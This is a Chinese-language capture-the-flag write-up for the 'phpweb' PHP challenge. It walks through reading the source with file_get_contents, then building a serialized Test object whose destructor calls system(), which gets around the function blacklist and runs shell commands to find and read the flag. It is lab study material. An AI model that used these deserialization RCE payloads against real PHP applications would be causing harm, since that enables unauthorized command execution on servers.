![[Pasted image 20221113204640.png]]

---
每隔五秒`POST`一次，传递`func`和`p`参数
![[Pasted image 20221113204657.png]]
![[Pasted image 20221113204833.png]]
```php
func=abc&p=123
```
> call_user_func() expects parameter 1 to be a valid callback, function 'abc' not found or invalid function name

尝试`system`执行
```php
func=system&p=ls
```
> Hacker...

被过滤了QAQ

再尝试`file_get_contents`获取`flag`
```php
func=file_get_contents&p=/flag
```
> file_get_contents(/flag): failed to open stream: No such file or directory

并没有`/flag`这个文件，但是`file_get_contents`没有被过滤，尝试利用这一点获取`index.php`的内容
```php
func=file_get_contents&p=index.php
```

```php
<!DOCTYPE html>
<html>
	<head>
	    <title>phpweb</title>
	    <style type="text/css">
	        body {
	            background: url("bg.jpg") no-repeat;
	            background-size: 100%;
	        }
	        p {
	            color: white;
	        }
	    </style>
	</head>

	<body>
	<script language=javascript>
	    setTimeout("document.form1.submit()",5000)
	</script>
	<p>
	    <?php
	    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
	    function gettime($func, $p) {
	        $result = call_user_func($func, $p);
	        $a= gettype($result);
	        if ($a == "string") {
	            return $result;
	        } else {return "";}
	    }
	    class Test {
	        var $p = "Y-m-d h:i:s a";
	        var $func = "date";
	        function __destruct() {
	            if ($this->func != "") {
	                echo gettime($this->func, $this->p);
	            }
	        }
	    }
	    $func = $_REQUEST["func"];
	    $p = $_REQUEST["p"];
	
	    if ($func != null) {
	        $func = strtolower($func);
	        if (!in_array($func,$disable_fun)) {
	            echo gettime($func, $p);
	        }else {
	            die("Hacker...");
	        }
	    }
	    ?>
	</p>
	<form  id=form1 name=form1 action="index.php" method=post>
	    <input type=hidden id=func name=func value='date'>
	    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
	</body>
</html>
```
好家伙，ban了这么多
注意到有个从没用到的`Test`类，里边还有个`__destruct`方法，而且`unserialize`也没被ban，看来反序列化八九不离十了
大致思路是构造payload，利用反序列化生成`Test`类的一个对象，再借由其`__destruct`方法绕过过滤

```php
<?php
class Test {
    var $p;
    var $func;
}

$payload = new Test;
$payload->func = "system";
$payload->p = 'find / -name *flag*';
echo serialize($payload);
?>
```
> O:4:"Test":2:{s:1:"p";s:19:"find / -name \*flag\*";s:4:"func";s:6:"system";}
```php
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:19:"find / -name *flag*";s:4:"func";s:6:"system";}
```

```
...
/tmp/flagoefiu4r93
...
```
---
读取`flag`
```php
$payload->p = 'cat /tmp/flagoefiu4r93';
```
> O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}

```php
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```
```
flag{3b352024-0ec2-4ac3-a110-9cbd86917b0c}
```
#Web #PHP #反序列化 #RCE